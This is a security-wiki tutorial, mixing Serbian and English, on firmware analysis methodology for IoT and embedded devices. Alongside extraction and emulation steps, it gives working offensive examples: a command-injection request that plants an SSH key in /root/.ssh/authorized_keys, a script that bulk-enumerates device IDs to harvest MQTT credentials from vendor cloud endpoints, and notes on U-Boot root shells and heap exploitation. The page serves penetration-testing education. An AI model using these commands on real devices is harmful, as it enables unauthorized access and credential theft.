# Analiza firmvera

{{#include ../../banners/hacktricks-training.md}}

## **Uvod**

### Povezani resursi


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmver je ključni softver koji omogućava uređajima ispravan rad tako što upravlja i olakšava komunikaciju između hardverskih komponenti i softvera sa kojim korisnici stupaju u interakciju. Čuva se u trajnoj memoriji, što omogućava uređaju pristup vitalnim instrukcijama od trenutka uključenja, dovodeći do pokretanja operativnog sistema. Ispitivanje i eventualna izmena firmvera su kritični koraci u identifikaciji bezbednosnih ranjivosti.

## **Prikupljanje informacija**

**Prikupljanje informacija** je ključni početni korak za razumevanje sastava uređaja i tehnologija koje koristi. Ovaj proces obuhvata prikupljanje podataka o:

- CPU arhitekturi i operativnom sistemu koji koristi
- Specifičnostima bootloader-a
- Rasporedu hardvera i datasheet-ovima
- Metrijama codebase-a i lokacijama izvornog koda
- Eksternim bibliotekama i tipovima licenci
- Istoriji update-ova i regulatornim sertifikatima
- Arhitektonskim i flow dijagramima
- Bezbednosnim procenama i identifikovanim ranjivostima

U tu svrhu, alati open-source intelligence (OSINT) su neprocenjivi, kao i analiza bilo kojih dostupnih open-source softverskih komponenti kroz ručni i automatizovani pregled. Alati kao što su [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) nude besplatnu static analysis koju možete iskoristiti za pronalaženje potencijalnih problema.

## **Nabavka firmvera**

Dobijanje firmvera može se pristupiti na više načina, svaki sa sopstvenim nivoom složenosti:

- **Direktno** od izvora (programeri, proizvođači)
- **Kompajliranjem/izgradnjom** iz dostavljenih uputstava
- **Preuzimanjem** sa zvaničnih support sajtova
- Korišćenjem **Google dork** upita za pronalaženje hostovanih firmware fajlova
- Direktnim pristupom **cloud storage**-u, alatima kao što je [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Presretanjem **updates** putem man-in-the-middle tehnika
- **Vađenjem** iz uređaja preko konekcija kao što su **UART**, **JTAG**, ili **PICit**
- **Presluškivanjem** zahteva za ažuriranje unutar komunikacije uređaja
- Identifikovanjem i korišćenjem **hardcoded update endpoints**
- **Dumpovanjem** iz bootloader-a ili mreže
- **Uklanjanjem i čitanjem** memorijskog čipa, kada ništa drugo ne uspe, koristeći odgovarajuće hardverske alate

### UART-only logs: force a root shell via U-Boot env in flash

If UART RX is ignored (logs only), you can still force an init shell by **editing the U-Boot environment blob offline:**

1. Dump SPI flash with a SOIC-8 clip + programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Locate the U-Boot env partition, edit `bootargs` to include `init=/bin/sh`, and **recompute the U-Boot env CRC32** for the blob.
3. Reflash only the env partition and reboot; a shell should appear on UART.

Ovo je korisno na embedded uređajima gde je bootloader shell onemogućen, ali je env particija upisiva putem eksternog pristupa flash-u.

## Analiza firmvera

Sada kada **imate firmver**, potrebno je izvući informacije o njemu da biste znali kako da postupite. Različiti alati koje možete koristiti za to:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
If you don't find much with those tools check the **entropy** of the image with `binwalk -E <bin>`, if low entropy, then it's not likely to be encrypted. If high entropy, Its likely encrypted (or compressed in some way).

Moreover, you can use these tools to extract **files embedded inside the firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Or [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) to inspect the file.

### Dobijanje datotečnog sistema

With the previous commented tools like `binwalk -ev <bin>` you should have been able to **izvucite datotečni sistem**.\
Binwalk usually extracts it inside a **folder named as the filesystem type**, which usually is one of the following: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ručno izdvajanje datotečnog sistema

Sometimes, binwalk will **not have the magic byte of the filesystem in its signatures**. In these cases, use binwalk to **pronađete offset datotečnog sistema i izdvojite kompresovani datotečni sistem** from the binary and **ručno izvadite** the filesystem according to its type using the steps below.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Pokrenite sledeću **dd command** carving the Squashfs filesystem.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatively, the following command could also be run.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- For squashfs (used in the example above)

`$ unsquashfs dir.squashfs`

Files will be in "`squashfs-root`" directory afterwards.

- CPIO archive files

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- For jffs2 filesystems

`$ jefferson rootfsfile.jffs2`

- For ubifs filesystems with NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analyzing Firmware

Kada se firmware dobije, neophodno je rastaviti ga kako bi se razumela njegova struktura i potencijalne ranjivosti. Ovaj proces podrazumeva korišćenje različitih alata za analizu i ekstrakciju korisnih podataka iz firmware image-a.

### Initial Analysis Tools

Niz komandi je dat za početnu inspekciju binarnog fajla (oznaka `<bin>`). Ove komande pomažu u identifikaciji tipova fajlova, ekstrakciji stringova, analizi binarnih podataka i razumevanju detalja particija i fajl-sistema:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Da bi se procenilo stanje enkripcije image-a, proverava se **entropija** pomoću `binwalk -E <bin>`. Niska entropija sugeriše odsustvo enkripcije, dok visoka entropija ukazuje na moguću enkripciju ili kompresiju.

Za izdvajanje **ugrađenih datoteka**, preporučuju se alati i resursi kao što su dokumentacija **file-data-carving-recovery-tools** i **binvis.io** za inspekciju fajlova.

### Ekstrakcija datotečnog sistema

Korišćenjem `binwalk -ev <bin>` obično se može izdvojiti datotečni sistem, često u direktorijum nazvan prema tipu datotečnog sistema (npr. squashfs, ubifs). Međutim, kada **binwalk** ne prepozna tip datotečnog sistema zbog nedostatka magic bytes, neophodno je ručno izdvajanje. To podrazumeva korišćenje `binwalk` za lociranje offseta datotečnog sistema, a zatim `dd` komandom isečavanje datotečnog sistema:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Afterwards, depending on the filesystem type (e.g., squashfs, cpio, jffs2, ubifs), different commands are used to manually extract the contents.

### Analiza fajl sistema

Sa izvađenim fajl sistemom, počinje pretraga za sigurnosnim propustima. Pažnja se obraća na insecure network daemons, hardcoded credentials, API endpoints, update server funkcionalnosti, nekompajlirani kod, startup skripte i kompajlirane binarne fajlove za offline analizu.

**Ključne lokacije** i **stavke** za pregled uključuju:

- **etc/shadow** i **etc/passwd** za korisničke kredencijale
- SSL certificates and keys in **etc/ssl**
- Konfiguracione i skript fajlove za potencijalne ranjivosti
- Ugrađene binarne fajlove za dalju analizu
- Uobičajeni IoT device web serveri i binarni fajlovi

Nekoliko alata pomaže u otkrivanju osetljivih informacija i ranjivosti unutar fajl sistema:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) za pretragu osetljivih informacija
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) za sveobuhvatnu analizu firmware-a
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), i [**EMBA**](https://github.com/e-m-b-a/emba) za statičku i dinamičku analizu

### Bezbednosne provere kompajliranih binarnih fajlova

I izvorni kod i kompajlirani binarni fajlovi pronađeni u fajl sistemu moraju biti detaljno ispitani zbog ranjivosti. Alati kao što su **checksec.sh** za Unix binarne i **PESecurity** za Windows binarne pomažu da se identifikuju nezaštićeni binarni fajlovi koji bi mogli biti iskorišćeni.

## Harvesting cloud config and MQTT credentials via derived URL tokens

Mnogi IoT hubovi preuzimaju konfiguraciju po uređaju sa cloud endpoint-a koji izgleda ovako:

- `https://<api-host>/pf/<deviceId>/<token>`

During firmware analysis you may find that `<token>` is derived locally from the device ID using a hardcoded secret, for example:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Ovaj dizajn omogućava svakome ko sazna deviceId i STATIC_KEY da rekonstruše URL i povuče cloud config, često otkrivajući plaintext MQTT credentials i topic prefixes.

Praktičan tok rada:

1) Extract deviceId from UART boot logs

- Povežite 3.3V UART adapter (TX/RX/GND) i snimite zapise:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Potražite linije koje ispisuju obrazac URL-a cloud config i adresu brokera, na primer:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Otkrivanje STATIC_KEY i algoritma tokena iz firmware

- Učitajte binarne datoteke u Ghidra/radare2 i pretražite putanju konfiguracije ("/pf/") ili upotrebu MD5.
- Potvrdite algoritam (npr. MD5(deviceId||STATIC_KEY)).
- Izračunajte token u Bash i pretvorite digest u velika slova:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Sakupi cloud config i MQTT credentials

- Sastavi URL i povuci JSON koristeći curl; parsiraj sa jq da izvučeš tajne:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Zloupotrebite plaintext MQTT i slabe topic ACLs (ako su prisutni)

- Koristite pronađene kredencijale da se pretplatite na maintenance topics i tražite osetljive događaje:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerisanje predvidivih device ID-ova (u velikoj skali, uz autorizaciju)

- Mnogi ekosistemi ugrađuju vendor OUI/product/type bajtove praćene sekvencijalnim sufiksom.
- Možete iterirati kandidatske ID-jeve, izvoditi tokene i programatski dohvatiti konfiguracije:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Napomene
- Uvek pribavite eksplicitnu autorizaciju pre nego što pokušate mass enumeration.
- Preferirajte emulation ili static analysis da povratite secrets bez modifikovanja target hardware kad je moguće.

Proces emulacije firmware omogućava **dynamic analysis** bilo rada uređaja ili pojedinačnog programa. Ovakav pristup može naići na probleme zbog zavisnosti od hardware-a ili architecture, ali prebacivanje root filesystem-a ili određenih binaries na uređaj sa odgovarajućom architecture i endianness-om, kao što je Raspberry Pi, ili na pre-built virtual machine, može olakšati dalja testiranja.

### Emulacija pojedinačnih binaries

Za ispitivanje pojedinačnih programa, presudno je identifikovati endianness i CPU architecture programa.

#### Primer za MIPS Architecture

Za emulaciju MIPS architecture binary, može se koristiti komanda:
```bash
file ./squashfs-root/bin/busybox
```
A za instalaciju potrebnih alata za emulaciju:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Za MIPS (big-endian), `qemu-mips` se koristi, a za little-endian binarne datoteke izbor bi bio `qemu-mipsel`.

#### Emulacija ARM arhitekture

Za ARM binarne datoteke proces je sličan — koristi se emulator `qemu-arm` za emulaciju.

### Emulacija celog sistema

Alati poput [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), i drugih, olakšavaju kompletnu emulaciju firmware-a, automatizuju proces i pomažu u dinamičkoj analizi.

## Dinamička analiza u praksi

U ovoj fazi se za analizu koristi ili stvarno ili emulirano uređajno okruženje. Ključno je zadržati shell pristup OS-u i datotečnom sistemu. Emulacija možda neće savršeno oponašati hardverske interakcije, što može zahtevati povremeno restartovanje emulacije. Analiza bi trebala ponovo pregledati datotečni sistem, eksploatisati izložene webpages i mrežne servise, i istražiti ranjivosti bootloader-a. Testovi integriteta firmware-a su kritični za identifikaciju potencijalnih backdoor ranjivosti.

## Tehnike runtime analize

Runtime analiza podrazumeva interakciju sa procesom ili binarnom datotekom u njegovom radnom okruženju, koristeći alate poput gdb-multiarch, Frida i Ghidra za postavljanje breakpoints i identifikovanje ranjivosti kroz fuzzing i druge tehnike.

Za embedded targets bez punog debugger-a, **kopirajte statički povezani `gdbserver`** na uređaj i povežite se udaljeno:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
## Binary Exploitation i Proof-of-Concept

Razvijanje PoC-a za identifikovane ranjivosti zahteva duboko razumevanje ciljne arhitekture i programiranje u niskonivskim jezicima. Binary runtime protections u embedded systems su retke, ali kada postoje, tehnike kao Return Oriented Programming (ROP) mogu biti neophodne.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc koristi fastbins slično glibc-u. Kasnija velika alokacija može pokrenuti `__malloc_consolidate()`, tako da bilo koji lažni chunk mora proći provere (razumna veličina, `fd = 0`, i okolni chunk-ovi koji su označeni kao "in use").
- **Non-PIE binaries under ASLR:** ako je ASLR omogućen, ali glavni binarni fajl je **non-PIE**, adrese u-binaru `.data/.bss` su stabilne. Možete ciljati region koji već podseća na validan heap chunk header da biste postigli fastbin alokaciju na **function pointer table**.
- **Parser-stopping NUL:** kada se parsira JSON, `\x00` u payload-u može zaustaviti parsiranje dok ostavlja prateće bajtove pod kontrolom napadača za stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** ROP chain koji poziva `open("/proc/self/mem")`, `lseek()` i `write()` može postaviti izvršni shellcode u poznatu mapu memorije i skočiti na njega.

## Pripremljeni operativni sistemi za analizu firmware-a

Operativni sistemi kao što su [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) pružaju predkonfigurisana okruženja za analizu/bezbednosno testiranje firmware-a, opremljena potrebnim alatima.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS je distribucija namenjena da pomogne pri izvršavanju security assessment-a i penetration testing-a Internet of Things (IoT) uređaja. Uštedi vam vreme pružajući predkonfigurisano okruženje sa svim neophodnim alatima.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operativni sistem baziran na Ubuntu 18.04, predinstaliran sa alatima za firmware security testing.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Čak i kada proizvođač implementira kriptografske provere potpisa za firmware slike, **zaštita protiv version rollback-a (downgrade) se često izostavlja**. Kada boot- ili recovery-loader samo verifikuje potpis ugrađenim javnim ključem, ali ne upoređuje *verziju* (ili monotoni brojač) slike koja se flešuje, napadač može legitimno instalirati **stariju, ranjivu verziju firmware-a koja i dalje nosi važeći potpis** i time ponovo uvesti ranjivosti koje su bile zakrpljene.

Tipičan tok napada:

1. **Obtain an older signed image**
* Preuzmite je sa javnog download portala proizvođača, CDN-a ili sajta za podršku.
* Izdvojite je iz pratećih mobilnih/desktop aplikacija (npr. unutar Android APK-a pod `assets/firmware/`).
* Nabavite je iz third-party repozitorijuma kao što su VirusTotal, Internet arhive, forumi itd.
2. **Upload or serve the image to the device** via any exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, itd.
* Mnogi consumer IoT uređaji izlažu *unauthenticated* HTTP(S) endpoint-e koji prihvataju Base64-encoded firmware blob-ove, dekodiraju ih server-side i pokreću recovery/upgrade.
3. Nakon downgrade-a, iskoristite ranjivost koja je bila zakrpljena u novijem izdanju (na primer filtro za command-injection koji je dodat kasnije).
4. Opcionalno ponovo flešujte najnoviju sliku ili onemogućite update-e da biste izbegli otkrivanje kada ste postigli persistence.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
U ranjivom (downgraded) firmware-u, parametar `md5` se direktno konkatenira u shell komandu bez sanitizacije, što omogućava injekciju proizvoljnih komandi (ovde – omogućavanje SSH key-based root access). Kasnije verzije firmware-a su uvele osnovni filter karaktera, ali odsustvo zaštite od downgrade-a čini ispravku besmislenim.

### Extracting Firmware From Mobile Apps

Mnogi vendor-i bundle-ju pune firmware images unutar svojih companion mobile applications tako da aplikacija može da ažurira uređaj preko Bluetooth/Wi‑Fi. Ovi paketi se obično čuvaju nešifrovani u APK/APEX pod putanjama poput `assets/fw/` ili `res/raw/`. Alati kao `apktool`, `ghidra`, ili čak običan `unzip` vam omogućavaju da izvucite potpisane image-e bez dodirivanja fizičkog hardvera.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Kontrolna lista za procenu Update Logic

* Da li je transport/authentication *update endpoint*-a adekvatno zaštićen (TLS + authentication)?
* Da li uređaj upoređuje **version numbers** ili **monotonic anti-rollback counter** pre flashing-a?
* Da li je image verifikovan unutar secure boot chain-a (npr. signatures proverene od strane ROM code)?
* Da li userland code vrši dodatne sanity checks (npr. allowed partition map, model number)?
* Da li *partial* ili *backup* update tokovi ponovo koriste istu validation logic?

> 💡  Ako bilo šta od navedenog nedostaje, platforma je verovatno ranjiva na rollback attacks.

## Vulnerable firmware za vežbu

Za vežbu pronalaženja ranjivosti u firmware-u, koristite sledeće vulnerable firmware projekte kao početnu tačku.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Trening i Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## Reference

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)

{{#include ../../banners/hacktricks-training.md}}
